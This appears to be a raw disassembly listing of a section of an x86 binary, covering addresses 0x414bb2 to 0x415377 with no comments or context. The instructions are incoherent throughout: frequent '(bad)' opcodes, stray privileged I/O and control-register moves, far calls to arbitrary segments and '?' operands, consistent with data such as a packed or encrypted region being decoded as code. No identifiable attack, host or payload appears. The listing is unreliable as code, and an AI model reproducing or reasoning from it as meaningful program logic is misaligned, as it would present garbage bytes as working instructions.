  414bb2:	sbb    BYTE PTR [edx+0xe68dfd8],dl
  414bb8:	sub    BYTE PTR [edx+0x75],bh
  414bbb:	cwde   
  414bbc:	loope  0x414b95
  414bbe:	pusha  
  414bbf:	fild   QWORD PTR [ebx]
  414bc1:	sar    ah,cl
  414bc3:	xchg   ecx,eax
  414bc4:	push   0x6974911d
  414bc9:	ins    DWORD PTR es:[edi],dx
  414bca:	xchg   ebx,eax
  414bcb:	fwait
  414bcc:	div    esp
  414bce:	inc    edi
  414bcf:	sub    BYTE PTR [ecx],al
  414bd1:	pop    eax
  414bd2:	cmc    
  414bd3:	iret   
  414bd4:	xlat   BYTE PTR ds:[ebx]
  414bd5:	nop
  414bd6:	in     al,dx
  414bd7:	adc    edx,DWORD PTR [esi]
  414bd9:	pushf  
  414bda:	xchg   edi,eax
  414bdb:	ss xchg edi,eax
  414bdd:	xlat   BYTE PTR ds:[ebx]
  414bde:	and    eax,0x7748492b
  414be3:	pop    esp
  414be4:	or     DWORD PTR [esi+edi*8-0x3e],0xfffffffa
  414be9:	jecxz  0x414c40
  414beb:	mov    ecx,0xf940783a
  414bf0:	jo     0x414c48
  414bf2:	cmp    al,0x6
  414bf4:	fwait
  414bf5:	loop   0x414be8
  414bf7:	jb     0x414c44
  414bf9:	call   0xb2ff:0x1c14e324
  414c00:	repz mov edx,0x667d9ebd
  414c06:	pop    ebx
  414c07:	add    eax,0x18cf1740
  414c0c:	sub    al,0xb7
  414c0e:	arpl   WORD PTR [edx+0x18],ax
  414c11:	cmp    eax,0xcec62ac9
  414c16:	cmp    ah,BYTE PTR [ebx+eax*8]
  414c19:	lods   al,BYTE PTR ds:[esi]
  414c1a:	pusha  
  414c1b:	leave  
  414c1c:	ins    BYTE PTR es:[edi],dx
  414c1d:	jns    0x414c98
  414c1f:	push   cs
  414c20:	jl     0x414ba6
  414c22:	mov    al,0x95
  414c24:	push   edx
  414c25:	fistp  QWORD PTR [esi+0x6c]
  414c28:	adc    edx,ecx
  414c2a:	and    cl,BYTE PTR [edx]
  414c2c:	data16 and BYTE PTR [ebx+0x43],0x2d
  414c31:	dec    eax
  414c32:	retf   0xac2a
  414c35:	xor    bl,0xf9
  414c38:	jae    0x414bf8
  414c3a:	aas    
  414c3b:	iret   
  414c3c:	mov    edx,ss
  414c3e:	xchg   BYTE PTR [esp+eiz*2],dh
  414c41:	pop    edi
  414c42:	add    eax,0x775bab3a
  414c47:	sbb    DWORD PTR [edx-0x24],0xb5a9a9df
  414c4e:	cmp    ebp,DWORD PTR [ebx]
  414c50:	mov    WORD PTR [eax],?
  414c52:	xchg   edx,eax
  414c53:	and    ebp,DWORD PTR [edx-0x70786e9d]
  414c59:	xor    esp,esi
  414c5b:	mov    dh,0x3c
  414c5d:	push   edx
  414c5e:	out    0x84,al
  414c60:	fidivr WORD PTR [ebp+0x3]
  414c63:	push   ds
  414c64:	test   BYTE PTR [edx-0x17f69ba3],ah
  414c6a:	add    ah,BYTE PTR [eax+0x1802edfb]
  414c70:	adc    DWORD PTR [ebx+0x1f1a8bea],edx
  414c76:	sbb    ecx,edi
  414c78:	sbb    BYTE PTR ds:[ecx-0x37558608],bl
  414c7f:	clc    
  414c80:	adc    dl,BYTE PTR [edi]
  414c82:	xchg   ebp,eax
  414c83:	or     DWORD PTR [esi+0x61],edx
  414c86:	mov    bh,0x0
  414c88:	sub    al,0x9a
  414c8a:	outs   dx,DWORD PTR ds:[esi]
  414c8b:	xor    BYTE PTR [edx+eiz*1],bh
  414c8e:	bound  esp,QWORD PTR [ebx+0xd45325]
  414c94:	push   cs
  414c95:	cdq    
  414c96:	mov    esp,0xd3538f4b
  414c9b:	cmc    
  414c9c:	pusha  
  414c9d:	add    BYTE PTR [edx+esi*8+0x72d58e6d],dl
  414ca4:	push   edx
  414ca5:	mov    eax,ds:0xc9ab4ca1
  414caa:	sbb    BYTE PTR [eax+0x2404fa50],bl
  414cb0:	adc    DWORD PTR [ebx+ebp*8-0x6b],esp
  414cb4:	pop    ss
  414cb5:	stos   BYTE PTR es:[edi],al
  414cb6:	xor    DWORD PTR [edi+0x59d3131f],edx
  414cbc:	enter  0x53dd,0x1b
  414cc0:	mov    bh,0x4b
  414cc2:	sahf   
  414cc3:	shl    BYTE PTR [esi+0x16],1
  414cc6:	aaa    
  414cc7:	push   edi
  414cc8:	xor    BYTE PTR [edi-0x72],0xf1
  414ccc:	call   0xbcc4:0xcb9dd705
  414cd3:	pop    ebx
  414cd4:	adc    al,BYTE PTR [edx+0x2f63c6a5]
  414cda:	jle    0x414cda
  414cdc:	and    al,0xdd
  414cde:	push   0xfdab18ab
  414ce3:	out    dx,eax
  414ce4:	mov    eax,ds:0xf7779c98
  414ce9:	mov    edi,0x39f65411
  414cee:	pop    esi
  414cef:	and    ecx,esp
  414cf1:	pop    esp
  414cf2:	adc    al,0x5b
  414cf4:	aaa    
  414cf5:	aam    0x31
  414cf7:	loope  0x414ccc
  414cf9:	cmp    BYTE PTR [ebp-0x3cebf410],0x14
  414d00:	adc    dh,BYTE PTR [esi-0x4]
  414d03:	dec    ecx
  414d04:	xchg   edx,eax
  414d05:	popf   
  414d06:	pusha  
  414d07:	aad    0x66
  414d09:	pop    ss
  414d0a:	mov    dl,0xce
  414d0c:	ins    DWORD PTR es:[edi],dx
  414d0d:	mov    ebx,DWORD PTR [ecx+0x2d]
  414d10:	test   eax,0xeaa348d0
  414d15:	cmp    eax,0xd50f9750
  414d1a:	cmp    eax,0xba7a154c
  414d1f:	xor    dl,bl
  414d21:	into   
  414d22:	mov    bh,0x0
  414d24:	call   0x4e5e:0xd1aa6ae5
  414d2b:	push   ebx
  414d2c:	inc    esp
  414d2d:	dec    esp
  414d2e:	out    dx,eax
  414d2f:	mov    ds:0xe9c4af29,eax
  414d34:	div    BYTE PTR [edx-0x753139f2]
  414d3a:	shl    BYTE PTR [eax+0x21],0xe7
  414d3e:	inc    ecx
  414d3f:	fwait
  414d40:	cmp    al,0x6d
  414d42:	xchg   esi,eax
  414d43:	(bad)  
  414d44:	lods   al,BYTE PTR ds:[esi]
  414d45:	jmp    esp
  414d47:	cmp    BYTE PTR [ecx-0x7ce3264d],ch
  414d4d:	hlt    
  414d4e:	lds    eax,FWORD PTR [edi+eax*8+0x9]
  414d52:	(bad)  
  414d53:	xor    dh,BYTE PTR [edx+0x3e]
  414d56:	(bad)  
  414d57:	jmp    0x414db0
  414d59:	add    al,0xf0
  414d5b:	sbb    edx,0x70
  414d5e:	addr16 xchg ebp,eax
  414d60:	cs dec ebp
  414d62:	aaa    
  414d63:	cdq    
  414d64:	push   ss
  414d65:	xchg   ecx,eax
  414d66:	les    ecx,FWORD PTR [edx-0x80]
  414d69:	popa   
  414d6a:	jmp    0x414d6b
  414d6c:	in     al,0x2a
  414d6e:	jecxz  0x414dde
  414d70:	mov    edx,0x933f99fa
  414d75:	icebp  
  414d76:	(bad)  
  414d77:	iret   
  414d78:	not    BYTE PTR [edi]
  414d7a:	jae    0x414d16
  414d7c:	jge    0x414d45
  414d7e:	aas    
  414d7f:	jl     0x414d20
  414d81:	inc    ebx
  414d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d83:	idiv   cl
  414d85:	sbb    ecx,DWORD PTR [eax+0x895f645]
  414d8b:	mov    eax,0x12288857
  414d90:	pop    eax
  414d91:	push   es
  414d92:	jns    0x414e10
  414d94:	addr16 icebp 
  414d96:	mov    edx,0x160caba3
  414d9b:	add    BYTE PTR [ecx+0x618c1ca3],al
  414da1:	mov    ds:0xcc69fb93,al
  414da6:	xor    BYTE PTR fs:[eax],cl
  414da9:	push   0xffffff84
  414dab:	cmp    DWORD PTR [ebx+0x69a1acd0],0xdd6284d3
  414db5:	push   edx
  414db6:	xor    BYTE PTR [eax+edi*2],0xda
  414dba:	inc    ebp
  414dbb:	sub    eax,0x4c931aa2
  414dc0:	loop   0x414d8b
  414dc2:	int    0xdf
  414dc4:	(bad)  
  414dc5:	repnz or edx,DWORD PTR [ecx-0x6f]
  414dc9:	out    dx,al
  414dca:	mov    cl,0x15
  414dcc:	or     eax,0x8e684047
  414dd1:	(bad)  
  414dd2:	out    0x60,eax
  414dd4:	or     BYTE PTR [edx+eax*8],0x15
  414dd8:	sbb    BYTE PTR [ebp+0x11],dh
  414ddb:	data16 sti 
  414ddd:	pusha  
  414dde:	iret   
  414ddf:	or     dh,BYTE PTR [eax+ebp*1-0x30]
  414de3:	call   0x1051be2b
  414de8:	push   es
  414de9:	ret    
  414dea:	xchg   esp,eax
  414deb:	and    ebp,ebp
  414ded:	lods   al,BYTE PTR ds:[si]
  414def:	iret   
  414df0:	and    eax,0xe973a166
  414df5:	test   BYTE PTR [ebx+eiz*8-0x74],0x2a
  414dfa:	sub    al,0xc6
  414dfc:	or     al,0xba
  414dfe:	add    dl,bl
  414e00:	xor    BYTE PTR [ecx-0x52e8386d],al
  414e06:	pop    ebp
  414e07:	aad    0x88
  414e09:	and    cl,dh
  414e0b:	popf   
  414e0c:	(bad)  
  414e0d:	call   0xcab:0x33a3889a
  414e14:	sti    
  414e15:	push   es
  414e16:	icebp  
  414e17:	lock cmp eax,0x11690d90
  414e1d:	sahf   
  414e1e:	imul   edi,DWORD PTR [esi+0x71f2f296],0xffffffb2
  414e25:	fcom   QWORD PTR [esi-0x8]
  414e28:	sub    eax,0xa4601f48
  414e2d:	lods   al,BYTE PTR ds:[esi]
  414e2e:	inc    ebx
  414e2f:	push   eax
  414e30:	pop    ebx
  414e31:	mov    ds,WORD PTR [esi+0x5cc6f86d]
  414e37:	add    BYTE PTR [edi-0x43e50945],ch
  414e3d:	push   cs
  414e3e:	fnstcw WORD PTR [ecx-0x366857bb]
  414e44:	test   al,0x38
  414e46:	lds    esi,FWORD PTR [edi-0x1c]
  414e49:	retf   
  414e4a:	push   edx
  414e4b:	sahf   
  414e4c:	lds    ebp,FWORD PTR [ecx+0x637c55aa]
  414e52:	sar    BYTE PTR [ebx],0xc7
  414e55:	test   eax,0xe862163b
  414e5a:	mov    ds:0x63a48391,al
  414e5f:	(bad)
  414e64:	jl     0x414ed5
  414e66:	xor    al,0x28
  414e68:	jns    0x414e6a
  414e6a:	outs   dx,BYTE PTR ds:[esi]
  414e6b:	out    0x19,al
  414e6d:	pusha  
  414e6e:	(bad)  
  414e6f:	sub    ebx,DWORD PTR [edx+0x49165212]
  414e75:	xchg   esp,eax
  414e76:	mov    ecx,0x4fb95615
  414e7b:	adc    cl,al
  414e7d:	fistp  QWORD PTR [edx+ecx*4+0x9a7c7c1]
  414e84:	addr16 in al,dx
  414e86:	push   es
  414e87:	repnz out 0xfa,al
  414e8a:	adc    DWORD PTR [edx-0x61d7b63a],edx
  414e90:	gs into 
  414e92:	es sbb al,0x14
  414e95:	addr16 data16 sti 
  414e98:	add    edx,DWORD PTR [edx+0x55]
  414e9b:	jnp    0x414ed7
  414e9d:	jp     0x414ede
  414e9f:	cs out 0x64,eax
  414ea2:	call   0x7078:0x43b16a2c
  414ea9:	mov    eax,ds:0x238663b6
  414eae:	ja     0x414ef1
  414eb0:	fs nop
  414eb2:	mov    eax,ds:0x7c8377d7
  414eb7:	pop    ds
  414eb8:	je     0x414ee4
  414eba:	lods   eax,DWORD PTR ds:[esi]
  414ebb:	sub    eax,0x92f41b01
  414ec0:	mov    ah,0x44
  414ec2:	adc    ecx,0x30808bfd
  414ec8:	push   edi
  414ec9:	int3   
  414eca:	mov    ecx,0x3f250905
  414ecf:	push   esp
  414ed0:	sub    eax,0x80caae5e
  414ed5:	pop    esi
  414ed6:	bound  ebp,QWORD PTR [esi]
  414ed8:	pop    eax
  414ed9:	in     eax,0xd8
  414edb:	dec    edi
  414edc:	sub    eax,0xf2ae52d9
  414ee1:	or     bl,ah
  414ee3:	mov    ecx,0xb87d6112
  414ee8:	push   eax
  414ee9:	xor    BYTE PTR [edi-0x6718fb5c],bl
  414eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef0:	push   cs
  414ef1:	push   ecx
  414ef2:	cmp    cl,BYTE PTR [ecx]
  414ef4:	adc    al,dh
  414ef6:	rcl    DWORD PTR [ebx],1
  414ef8:	mov    edx,DWORD PTR [edi+ecx*4-0x36]
  414efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414efd:	in     al,dx
  414efe:	mov    esp,0x6ab4d1dd
  414f03:	repnz push ebp
  414f05:	xor    DWORD PTR [ebx+0x65],esp
  414f08:	or     eax,DWORD PTR [edx]
  414f0a:	sub    DWORD PTR [ecx+0x35],0x8ce86c6b
  414f11:	jo     0x414f6c
  414f13:	adc    eax,0x122c43e7
  414f18:	mov    ch,0xc2
  414f1a:	dec    DWORD PTR [esi]
  414f1c:	push   ebx
  414f1d:	data16 in al,0x9c
  414f20:	cmp    bl,bh
  414f22:	dec    ebx
  414f23:	mov    edx,0x8ea06627
  414f28:	xchg   ebx,eax
  414f29:	xchg   BYTE PTR [esp+ebx*4-0x6701bc29],cl
  414f30:	xchg   BYTE PTR [ebx-0x34],ah
  414f33:	dec    esi
  414f34:	lock xor eax,0xf559e4fd
  414f3a:	ror    DWORD PTR [edx],cl
  414f3c:	lahf   
  414f3d:	pop    ds
  414f3e:	inc    ebp
  414f3f:	mov    ah,0xc4
  414f41:	in     al,dx
  414f42:	xlat   BYTE PTR ds:[ebx]
  414f43:	mov    dh,BYTE PTR [ebx+0x65f1da11]
  414f49:	stos   BYTE PTR es:[edi],al
  414f4a:	inc    ebx
  414f4b:	inc    eax
  414f4c:	ins    DWORD PTR es:[edi],dx
  414f4d:	push   edi
  414f4e:	jae    0x414f7f
  414f50:	sbb    BYTE PTR [ecx-0x58d5b435],0xe3
  414f57:	test   al,0x2d
  414f59:	xchg   BYTE PTR [edx],ah
  414f5b:	int    0xce
  414f5d:	or     DWORD PTR [ecx+esi*4],ecx
  414f60:	outs   dx,DWORD PTR ds:[esi]
  414f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f62:	lock and al,0x7c
  414f65:	mov    dl,BYTE PTR [ebp+eiz*2-0x241462c4]
  414f6c:	es enter 0xf1e0,0x10
  414f71:	mov    esi,0xecb66af4
  414f76:	cmp    eax,0x3a187d38
  414f7b:	and    al,0x69
  414f7d:	ret    
  414f7e:	mov    dl,0xf8
  414f80:	or     DWORD PTR [ecx+0x3e9e8e10],ebx
  414f86:	fisttp QWORD PTR [ecx-0x1cc3560d]
  414f8c:	push   ebp
  414f8d:	shl    DWORD PTR [eax+0x3e],0x5d
  414f91:	stos   DWORD PTR es:[edi],eax
  414f92:	loope  0x414f51
  414f94:	pop    ss
  414f95:	leave  
  414f96:	(bad)  
  414f97:	data16 sub ah,ah
  414f9a:	pusha  
  414f9b:	hlt    
  414f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f9d:	push   0x521e6e3c
  414fa2:	lahf   
  414fa3:	cmp    ah,BYTE PTR [ebx+0x2f]
  414fa6:	sub    dl,cl
  414fa8:	mov    ah,0xe5
  414faa:	xchg   esi,eax
  414fab:	mov    al,ds:0x9efc8e84
  414fb0:	mov    esp,0x211cfc3c
  414fb5:	sbb    eax,0xfd804c63
  414fba:	cld    
  414fbb:	jg     0x414f87
  414fbd:	inc    esi
  414fbe:	out    dx,eax
  414fbf:	ins    DWORD PTR es:[edi],dx
  414fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc1:	pop    esp
  414fc2:	(bad)  
  414fc3:	adc    al,BYTE PTR [eax+0x2d]
  414fc6:	sub    dh,cl
  414fc8:	dec    edi
  414fc9:	mov    ah,0xdc
  414fcb:	jns    0x414fcf
  414fcd:	cld    
  414fce:	cdq    
  414fcf:	adc    edi,0xa9aad03d
  414fd5:	push   esi
  414fd6:	lods   eax,DWORD PTR ds:[esi]
  414fd7:	xchg   ecx,eax
  414fd8:	aas    
  414fd9:	mov    ecx,0x720bed16
  414fde:	js     0x41501d
  414fe0:	add    eax,0x6a
  414fe3:	push   ds
  414fe4:	mov    ch,0x17
  414fe6:	cmc    
  414fe7:	xchg   esi,eax
  414fe8:	mov    ecx,0x84e44f84
  414fed:	push   ebx
  414fee:	jg     0x415023
  414ff0:	adc    cl,BYTE PTR [ebx+0xa]
  414ff3:	push   ebx
  414ff4:	lock push ecx
  414ff6:	inc    esi
  414ff7:	fsubr  QWORD PTR [edx]
  414ff9:	dec    edx
  414ffa:	dec    esp
  414ffb:	pop    esp
  414ffc:	(bad)  
  414ffd:	cmp    BYTE PTR [esi-0x6d98360e],cl
  415003:	inc    edi
  415004:	icebp  
  415005:	add    eax,0x7e9b6f10
  41500a:	(bad)  
  41500b:	push   esp
  41500c:	stos   BYTE PTR es:[edi],al
  41500d:	push   ds
  41500e:	push   ss
  41500f:	mov    bl,BYTE PTR [eax]
  415011:	mov    edx,0xa9324dd8
  415016:	dec    esi
  415017:	mov    cl,0x8c
  415019:	add    al,0xf7
  41501b:	popf   
  41501c:	(bad)  
  41501d:	das    
  41501e:	rol    BYTE PTR [esi-0x27b19b51],cl
  415024:	fwait
  415025:	(bad)  
  415026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415027:	retf   
  415028:	sub    DWORD PTR [esp+edi*4],esi
  41502b:	repz jns 0x415036
  41502e:	sbb    edi,edi
  415030:	psubq  mm0,QWORD PTR [edi]
  415033:	es pop edx
  415035:	test   BYTE PTR cs:[ebx+0x379e35cc],al
  41503c:	mov    esi,0xf4194006
  415041:	jge    0x4150b8
  415043:	inc    edi
  415044:	dec    esi
  415045:	adc    ecx,DWORD PTR [eax+edx*4]
  415048:	fcomp  DWORD PTR [ebp+eiz*2-0x6eb15fa0]
  41504f:	ret    0x7d6c
  415052:	sahf   
  415053:	add    al,0x66
  415055:	mov    edx,0xc5d4d25d
  41505a:	fdivr  st(1),st
  41505c:	add    eax,DWORD PTR [esi]
  41505e:	ss inc edi
  415060:	rol    DWORD PTR [eax],cl
  415062:	in     al,0x20
  415064:	cld    
  415065:	das    
  415066:	fistp  DWORD PTR [edi]
  415068:	mov    cs,esi
  41506a:	jo     0x4150a0
  41506c:	mov    al,0x86
  41506e:	pop    ebx
  41506f:	inc    eax
  415070:	pop    eax
  415071:	mov    ah,0x49
  415073:	sbb    ebp,eax
  415075:	xchg   ecx,eax
  415076:	fadd   st,st(4)
  415078:	pop    ecx
  415079:	dec    esi
  41507a:	mov    dh,0x75
  41507c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41507d:	or     esp,DWORD PTR [ebx+0x701062ee]
  415083:	jmp    0x513e:0xcfd4e49f
  41508a:	inc    esp
  41508b:	xor    eax,0x33ef34dc
  415090:	add    eax,0x49cfe777
  415095:	mov    ch,0xa9
  415097:	jmp    0x4e6d:0xa9d224aa
  41509e:	push   edi
  41509f:	pop    esp
  4150a0:	sub    al,0xd
  4150a2:	imul   ecx,ebx,0xf01845fc
  4150a8:	xchg   ecx,eax
  4150a9:	rcl    DWORD PTR [esi+0x3d9d1aa3],0x52
  4150b0:	retf   0xc2b7
  4150b3:	jle    0x415126
  4150b5:	arpl   WORD PTR [ecx],ax
  4150b7:	mov    dl,dh
  4150b9:	les    esp,FWORD PTR [edi-0x6e]
  4150bc:	imul   esp,DWORD PTR [edi-0x4a],0xffffff89
  4150c0:	sub    esp,esi
  4150c2:	jmp    0x415048
  4150c4:	popf   
  4150c5:	imul   esp,ecx,0x157e050e
  4150cb:	mov    ch,0x53
  4150cd:	das    
  4150ce:	pop    es
  4150cf:	and    ch,BYTE PTR [ecx+0x79]
  4150d2:	stos   BYTE PTR es:[edi],al
  4150d3:	mov    dl,0x14
  4150d5:	jmp    0x415141
  4150d7:	push   cs
  4150d8:	ror    BYTE PTR [ebx+0x164913d6],1
  4150de:	cmp    eax,DWORD PTR [eax+0x56322826]
  4150e4:	dec    edi
  4150e5:	inc    edi
  4150e6:	add    DWORD PTR [esi+edi*8+0x72],0xffffffe7
  4150eb:	dec    edi
  4150ec:	sbb    eax,0xd4f56d86
  4150f1:	iret   
  4150f2:	nop
  4150f3:	mov    esi,0xc94332fd
  4150f8:	xlat   BYTE PTR ds:[ebx]
  4150f9:	or     BYTE PTR [ebx+0x771f2813],al
  4150ff:	popf   
  415100:	fist   DWORD PTR [esi-0x5d]
  415103:	vpaddsw ymm4,ymm7,ymm1
  415107:	icebp  
  415108:	sti    
  415109:	sar    DWORD PTR fs:[edi],cl
  41510c:	jno    0x41511c
  41510e:	stos   BYTE PTR es:[edi],al
  41510f:	pop    ebx
  415110:	adc    DWORD PTR ds:0x85c4ff6,ebp
  415116:	xchg   esi,eax
  415117:	xlat   BYTE PTR ds:[ebx]
  415118:	jl     0x4150a5
  41511a:	dec    eax
  41511b:	fwait
  41511c:	push   ds
  41511d:	push   edi
  41511e:	and    BYTE PTR ds:0xfa8663e2,ch
  415124:	xchg   esp,eax
  415125:	adc    BYTE PTR ds:0x460ed8fc,dh
  41512b:	int    0x8a
  41512d:	cmp    eax,0x5cec52a5
  415132:	pop    esi
  415133:	not    DWORD PTR [edx-0x7]
  415136:	pop    esi
  415137:	jae    0x4150bb
  415139:	push   ebp
  41513a:	fwait
  41513b:	test   DWORD PTR [ecx+0x7e3f7039],0x13b4381b
  415145:	pop    eax
  415146:	xchg   edi,eax
  415147:	(bad)  
  415148:	mov    ebx,0x6f64b2d9
  41514d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41514e:	rcr    BYTE PTR gs:[edx+0x2c68ead3],cl
  415155:	cmp    al,0xad
  415157:	dec    edi
  415158:	ds and eax,0x70f2343f
  41515e:	push   ss
  41515f:	sahf   
  415160:	popa   
  415161:	jmp    0x41510f
  415163:	add    DWORD PTR [esi+0x5e],ebp
  415166:	div    BYTE PTR [eax]
  415168:	mov    edi,0xb66471fe
  41516d:	loopne 0x415139
  41516f:	call   0x71347dec
  415174:	lods   al,BYTE PTR ds:[esi]
  415175:	push   es
  415176:	mov    ecx,0x5e710ab9
  41517b:	push   edx
  41517c:	or     edx,ebx
  41517e:	push   esp
  41517f:	and    al,0xf3
  415181:	xlat   BYTE PTR ds:[ebx]
  415182:	jo     0x4151d4
  415184:	fistp  QWORD PTR [ebx]
  415186:	xor    ah,BYTE PTR [ebp+0x0]
  415189:	sbb    eax,0xe0134bf8
  41518e:	fild   DWORD PTR [edx]
  415190:	pusha  
  415191:	stos   DWORD PTR es:[edi],eax
  415192:	into   
  415193:	test   al,0x69
  415195:	add    ah,bh
  415197:	in     al,0x7f
  415199:	inc    esi
  41519a:	mov    eax,edi
  41519c:	ins    BYTE PTR es:[edi],dx
  41519d:	ret    0x979c
  4151a0:	xor    al,BYTE PTR [ebx+edx*1]
  4151a3:	xchg   BYTE PTR [edi+0x3ad0bafb],bl
  4151a9:	push   ds
  4151aa:	mov    esi,gs
  4151ac:	in     al,0x14
  4151ae:	in     al,dx
  4151af:	pop    ds
  4151b0:	iret   
  4151b1:	add    DWORD PTR [edx+eax*4+0x61],0xffffffd2
  4151b6:	sbb    eax,0xc0166222
  4151bb:	sbb    DWORD PTR [esi-0x1b],0xffffff9a
  4151bf:	jl     0x4151f3
  4151c1:	mov    bl,ah
  4151c3:	inc    edx
  4151c4:	(bad)  
  4151c5:	push   cs
  4151c6:	inc    ecx
  4151c7:	jnp    0x4151b1
  4151c9:	inc    ebx
  4151ca:	icebp  
  4151cb:	(bad)  
  4151cd:	sub    ecx,DWORD PTR [esi*2-0x3ff05524]
  4151d4:	das    
  4151d5:	adc    cl,BYTE PTR [ecx-0x56]
  4151d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d9:	jg     0x415176
  4151db:	push   edi
  4151dc:	cmp    DWORD PTR [esp+esi*8],edx
  4151df:	pop    edx
  4151e0:	mov    edx,0x463a9d07
  4151e5:	pop    ecx
  4151e6:	mov    eax,ds:0xd5c7aa48
  4151eb:	inc    esi
  4151ec:	daa    
  4151ed:	(bad)  
  4151ee:	mov    cr4,esi
  4151f1:	call   0x9e61:0x1cf1b50f
  4151f8:	inc    edx
  4151f9:	xor    al,0xb
  4151fb:	push   eax
  4151fc:	xchg   esi,eax
  4151fd:	call   0x30e3:0x208f6ec2
  415204:	add    BYTE PTR [ecx-0x12a9a694],bl
  41520a:	nop
  41520b:	retf   
  41520c:	xor    DWORD PTR [eax+0x25],0xffffffd2
  415210:	push   eax
  415211:	jg     0x41525f
  415213:	jge    0x4151c1
  415215:	fisttp WORD PTR [ebp-0xa13b773]
  41521b:	mov    BYTE PTR [esi],0xba
  41521e:	pop    eax
  41521f:	sbb    esi,DWORD PTR fs:[ebx-0x69]
  415223:	idiv   DWORD PTR [edi]
  415225:	lods   eax,DWORD PTR ds:[esi]
  415226:	or     eax,0x58195f30
  41522b:	push   esp
  41522c:	jno    0x41521d
  41522e:	inc    ebx
  41522f:	aas    
  415230:	mov    bl,0x8d
  415232:	push   edx
  415233:	add    edi,DWORD PTR [eax+0x4fa13f1c]
  415239:	mov    ?,WORD PTR [edi+0x46806f1c]
  41523f:	xor    esp,DWORD PTR [eax-0x7c90dd8]
  415245:	test   al,0x70
  415247:	xor    DWORD PTR [ecx-0x16],ebx
  41524a:	or     eax,0xbcf5dac
  41524f:	fldcw  WORD PTR [esi]
  415251:	outs   dx,DWORD PTR ds:[esi]
  415252:	hlt    
  415253:	out    0x6a,al
  415255:	ins    BYTE PTR es:[edi],dx
  415256:	enter  0xa037,0xfb
  41525a:	mov    ?,WORD PTR [ecx+eiz*1+0x22]
  41525e:	les    ebx,FWORD PTR [edx-0x6a]
  415261:	iret   
  415262:	out    dx,eax
  415263:	in     eax,0x68
  415265:	mov    al,ds:0xfb974cd9
  41526a:	pop    eax
  41526b:	dec    ebx
  41526c:	add    BYTE PTR fs:[eax+0x4f],bl
  415270:	movd   DWORD PTR [edi],mm3
  415273:	mov    ds,WORD PTR [edx-0x41c8b3e]
  415279:	push   eax
  41527a:	and    dl,dl
  41527c:	stos   BYTE PTR es:[edi],al
  41527d:	ficom  WORD PTR [ebp-0x18]
  415280:	mov    ah,BYTE PTR [ebp+ecx*8-0x736f856e]
  415287:	data16 adc BYTE PTR [edx+0x27f6aad5],dh
  41528e:	push   ss
  41528f:	sahf   
  415290:	fcom   DWORD PTR [edi]
  415292:	push   ecx
  415293:	dec    ecx
  415294:	ss repnz push cs
  415297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415298:	sbb    ecx,DWORD PTR [ebx+0x15648055]
  41529e:	test   eax,0x317a2589
  4152a3:	imul   ecx,DWORD PTR [edi+0x7ae5d25b],0x970182d
  4152ad:	cmp    al,0x1e
  4152af:	or     DWORD PTR [ecx-0x2bc07bf3],edx
  4152b5:	jp     0x415335
  4152b7:	xchg   ebx,eax
  4152b8:	dec    ecx
  4152b9:	inc    esp
  4152ba:	xchg   ecx,eax
  4152bb:	int    0xa6
  4152bd:	sahf   
  4152be:	loop   0x415253
  4152c0:	inc    esp
  4152c1:	loop   0x41530d
  4152c3:	inc    edx
  4152c4:	rcr    DWORD PTR [edi-0x5f],1
  4152c7:	test   DWORD PTR [ebx-0x6dc98c90],esi
  4152cd:	dec    eax
  4152ce:	imul   eax,DWORD PTR [eax],0x3fe2551d
  4152d4:	xchg   ebx,eax
  4152d5:	mov    ebx,0xeb329f55
  4152da:	xchg   DWORD PTR [esi-0x15],esi
  4152dd:	mov    DWORD PTR ds:0x42e3f2dd,esp
  4152e3:	mov    eax,0xab540c5a
  4152e8:	in     al,0xee
  4152ea:	call   0xbe93:0xb947f21d
  4152f1:	push   0x542d9357
  4152f6:	shl    BYTE PTR [ebp-0x662a599c],cl
  4152fc:	cdq    
  4152fd:	inc    edi
  4152fe:	jns    0x4152c6
  415300:	push   edx
  415301:	out    dx,al
  415302:	jecxz  0x4152cb
  415304:	cmp    al,0x4
  415306:	(bad)  
  415307:	pop    esi
  415308:	sub    BYTE PTR [ebp-0x78b710ac],dh
  41530e:	push   eax
  41530f:	out    0x69,al
  415311:	pop    edx
  415312:	lea    esi,[ecx-0x2]
  415315:	call   0x61ba:0xcc1f98fd
  41531c:	loope  0x415346
  41531e:	ins    BYTE PTR es:[edi],dx
  41531f:	sbb    BYTE PTR [ecx-0x6b],bl
  415322:	fs div eax
  415325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415326:	cli    
  415327:	dec    eax
  415328:	jno    0x415332
  41532a:	shr    ch,0x1d
  41532d:	sbb    eax,0x5cb28135
  415332:	sbb    BYTE PTR [edx-0x1b],cl
  415335:	mov    cl,0xfb
  415337:	das    
  415338:	std    
  415339:	ja     0x415358
  41533b:	dec    edi
  41533c:	or     dh,BYTE PTR [edx-0x1c]
  41533f:	mov    edi,0x31f9e5d2
  415344:	pop    ebx
  415345:	out    0x6b,al
  415347:	push   esi
  415348:	jp     0x41539d
  41534a:	stos   DWORD PTR es:[edi],eax
  41534b:	xlat   BYTE PTR ds:[ebx]
  41534c:	test   al,0x3b
  41534e:	jp     0x4153bd
  415350:	(bad)  
  415351:	mov    cs,WORD PTR [eax]
  415353:	(bad)  
  415354:	popf   
  415355:	cli    
  415356:	fcom   DWORD PTR [eax+0x63a7e788]
  41535c:	psrld  mm4,QWORD PTR [ebx+0x1f]
  415360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415361:	add    al,BYTE PTR ds:0x3849e2cf
  415367:	popf   
  415368:	pushf  
  415369:	daa    
  41536a:	arpl   WORD PTR [edx+ebx*4-0x52],si
  41536e:	imul   edi,DWORD PTR [ebx],0x52
  415371:	jae    0x4153e0
  415373:	pop    ds
  415374:	sub    eax,ecx
  415376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415377:	cmp    al,BYTE PTR [ecx-0x53]
